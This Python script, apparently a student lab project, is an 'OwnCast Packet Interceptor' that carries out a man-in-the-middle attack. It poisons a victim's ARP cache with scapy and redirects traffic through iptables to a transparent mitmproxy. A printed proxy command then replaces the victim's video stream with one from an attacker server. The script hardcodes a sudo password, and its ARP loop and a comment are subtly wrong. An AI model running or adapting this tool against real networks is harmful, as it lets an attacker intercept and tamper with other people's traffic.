import ipaddress
from getmac import get_mac_address as gma
from scapy.all import *
import argparse
import threading
from subprocess import Popen, PIPE
from scapy.layers.l2 import getmacbyip
import socket
import struct
import netifaces

# PLEASE NOTE
# This code only runs on Ubuntu with all dependencies installed
# This code requires you to run a given bash command in a second terminal

# Used tools
# https://mitmproxy.org/
# https://docs.mitmproxy.org/stable/howto-transparent/


# Read parser data
parser = argparse.ArgumentParser(description="OwnCast Packet Interceptor")
parser.add_argument("-host", default="192.168.231.4")  # Original OwnCast server
parser.add_argument("-port", default="8080")  # Port of original OwnCast server
parser.add_argument("-fake", default="localhost")  # IP of new OwnCast server (or localhost)
parser.add_argument("-fake_port", default="8080")  # Port of new OwnCast server
parser.add_argument("-victim", default="192.168.56.107")  # IP of victim
parser.add_argument("-victim_interface", default="enp0s8")  # interface onto which the victim is connected
parser.add_argument("-internet_interface", default="enp0s3")  # internet facing interface
args = parser.parse_args()

# Process parser data
host = ipaddress.IPv4Address(args.host)
port = args.port
victim_interface = args.victim_interface
internet_interface = args.internet_interface
if args.fake == 'localhost':
    fake = netifaces.ifaddresses(victim_interface)[netifaces.AF_INET][0]['addr']
else:
    fake = ipaddress.IPv4Address(args.fake)
fake_port = args.fake_port
victim = ipaddress.IPv4Address(args.victim)

print(f"Starting attack with this input:")
print(f"Original OwnCast server on {host}:{port}")
print(f"Attacker OwnCast server on {fake}:{fake_port}")
print(f"Victim on {victim} via interface {victim_interface}")
print(f"Internet facing interface {internet_interface}")

# Function to run bash with superuser rights
def run_bash(task):
    password = "group50"
    command = task.split()
    p = Popen(['sudo', '-S'] + command, stdin=PIPE, stderr=PIPE, universal_newlines=True)
    sudo_prompt = p.communicate(password + '\n')[1]
    return sudo_prompt


# Allow forwarding of packages
print(f"# Enabling package forwarding")
# sudo sysctl -w net.ipv4.ip_forward=1
run_bash("sudo sysctl -w net.ipv4.ip_forward=1")
# sudo sysctl -w net.ipv6.conf.all.forwarding=1
run_bash("sudo sysctl -w net.ipv6.conf.all.forwarding=1")

# We also need to block icmp messages
print(f"# Blocking ICMP message redirection")
# sudo sysctl -w .net.ipv4.conf.all.send_redirects=0
run_bash("sudo sysctl -w .net.ipv4.conf.all.send_redirects=0")

# Set up proxying
print(f"# Preparing proxy redirections [iptables]")
# flush old configuration
run_bash(f"sudo iptables -t nat -F")
run_bash(f"sudo ip6tables -t nat -F")
# sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8090
run_bash(f"sudo iptables -t nat -A PREROUTING -i {victim_interface} -p tcp --dport 80 -j REDIRECT --to-port 8090")
# sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 8080 -j REDIRECT --to-port 8090
run_bash(f"sudo iptables -t nat -A PREROUTING -i {victim_interface}  -p tcp --dport {port} -j REDIRECT --to-port 8090")
# sudo ip6tables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8090
run_bash(f"sudo ip6tables -t nat -A PREROUTING -i {victim_interface}  -p tcp --dport 80 -j REDIRECT --to-port 8090")
# sudo ip6tables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 8080 -j REDIRECT --to-port 8090
run_bash(f"sudo ip6tables -t nat -A PREROUTING -i {victim_interface}  -p tcp --dport {port} -j REDIRECT --to-port 8090")

# Allow fallback for non-proxied data (on internet facing interface enp0s3)
print(f"# Enabling NAT routing for other irrelevant traffic")
# sudo iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE
run_bash(f"sudo iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE")


# Start up MITM  in a thread
def start_proxy():
    print(f"# Enabling proxy")
    # sudo /home/owncast/Documents/mitmproxy/mitmproxy --mode transparent --showhost
    # --listen-port 8090 --map-remote "|.m3u8|//192.168.231.4:8080|//localhost:8080"
    # --map-remote "|.ts|//192.168.231.4:8080|//localhost:8080"
    # run_bash does not work as desired
    print("RUN THE FOLLOWING COMMAND IN A NEW TERMINAL")
    print(f"sudo /home/owncast/Documents/mitmproxy/mitmproxy --mode transparent --showhost --listen-port 8090 \
    --map-remote \"|.m3u8|//{host}:{port}|//{fake}:{fake_port}\" --map-remote \
    \"|.ts|//{host}:{port}|//{fake}:{fake_port}\"")


# Start thread for MITM
thread_proxy = threading.Thread(target=start_proxy, daemon=True)
thread_proxy.start()


# Debugging scripts
# sudo route
# sudo arp -a
# sudo iptables -t nat -L

# Function to become a forced gateway
# Will make the victim think that the attacker is every device in the subnetwork 255.255.255.0
def init_hijack(ip_victim, interface):
    # Lookup local MAC
    local_mac = gma(interface=interface)
    if local_mac is None:
        print(f"Could not find MAC for local machine")
        print(f"Aborting operation")
        return False
    else:
        print(f"Found local MAC: {local_mac}")

    # Lookup victim MAC
    mac_victim = getmacbyip(str(ip_victim))
    if mac_victim is None:
        print(f"Could not find MAC for victim ({ip_victim})")
        print(f"Aborting operation")
        return False
    else:
        print(f"Found victim ({ip_victim}) MAC: {mac_victim}")

    if local_mac == mac_victim:
        print(f"You're trying to fool yourself")
        print(f"Aborting operation")
        return False

    # Find subnetwork
    ip_victim_net = str(ip_victim).split(".")
    subnet = ip_victim_net[0] + "." + ip_victim_net[1] + "." + ip_victim_net[2] + "."
    print(f"Found subnet {subnet}x")

    # Define repeating ARP injection
    def repeat_arp(packets):
        while True:
            print(f"ARP attack running in background")
            for packet in packets:
                sendp(arp, iface=interface, verbose=False)
                time.sleep(0.02)

    # Prepare arp array
    arp_array = []

    # Tell victim that we are 255.255.255.x for all x in [1, 254]
    for x in range(1, 255):
        # Prepare ARP packet
        arp = Ether() / ARP()
        arp[Ether].src = local_mac
        arp[ARP].hwsrc = local_mac
        arp[ARP].psrc = str(subnet + str(x))
        arp[ARP].hwdst = mac_victim
        arp[ARP].pdst = str(ip_victim)
        arp_array.append(arp)

    # Spawn daemon threads
    thread_arp = threading.Thread(target=repeat_arp, args=(arp_array,))
    thread_arp.start()

    print(f"Started the injection thread")


# Function to initiate an ARP attack
def init_arp(ip_victim, ip_server, interface):
    # Lookup local MAC
    local_mac = gma(interface=interface)
    if local_mac is None:
        print(f"Could not find MAC for local machine")
        print(f"Aborting operation")
        return False
    else:
        print(f"Found local MAC: {local_mac}")

    # Lookup victim MAC
    mac_victim = getmacbyip(str(ip_victim))
    if mac_victim is None:
        print(f"Could not find MAC for victim ({ip_victim})")
        print(f"Aborting operation")
        return False
    else:
        print(f"Found victim ({ip_victim}) MAC: {mac_victim}")

    # Lookup server MAC
    mac_server = getmacbyip(str(ip_server))
    if mac_server is None:
        print(f"Could not find MAC for server ({ip_server})")
        print(f"Aborting operation")
        return False
    else:
        print(f"Found server ({ip_server}) MAC: {mac_server}")

    if local_mac == mac_victim or local_mac == mac_server or mac_victim == mac_server:
        print(f"MITM attack not possible in this setup (at least two devices are identical")
        print(f"Aborting operation")
        return False

    # Prepare ARP packets
    # tell victim that we are server
    arp = Ether() / ARP()
    arp[Ether].src = local_mac
    arp[ARP].hwsrc = local_mac
    arp[ARP].psrc = str(ip_server)
    arp[ARP].hwdst = mac_victim
    arp[ARP].pdst = str(ip_victim)

    print(f"Prepared ARP package to spoof as server for victim")

    # tell 102 that we are 101
    arp2 = Ether() / ARP()
    arp2[Ether].src = local_mac
    arp2[ARP].hwsrc = local_mac
    arp2[ARP].psrc = str(ip_victim)
    arp2[ARP].hwdst = mac_server
    arp2[ARP].pdst = str(ip_server)

    print(f"Prepared ARP package to spoof as victim for server")

    # Define repeating ARP injection
    def repeat_arp(this_packet):
        sendp(this_packet, iface=interface, loop=1, inter=2)  # send every 2 seconds

    # Run ARP injection as daemon thread
    thread1 = threading.Thread(target=repeat_arp, args=(arp,), daemon=True)
    thread2 = threading.Thread(target=repeat_arp, args=(arp2,), daemon=True)
    thread1.start()
    thread2.start()
    print(f"Started the injection threads")


# Run gateway attack
print(f"Pretending to be victim's ({victim}) entire network")
init_hijack(victim, victim_interface)
